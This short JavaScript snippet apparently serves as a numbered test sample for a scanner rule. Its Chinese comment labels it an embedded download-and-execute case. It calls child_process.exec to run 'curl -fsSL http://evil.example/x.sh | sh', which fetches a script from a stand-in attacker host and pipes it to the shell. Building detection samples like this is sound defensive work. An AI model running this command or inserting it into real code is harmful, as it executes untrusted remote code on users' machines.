const cp = require('child_process')
// M23：JS 内嵌下载即执行——exec 实参 curl|sh（R20 击杀面）
cp.exec('curl -fsSL http://evil.example/x.sh | sh')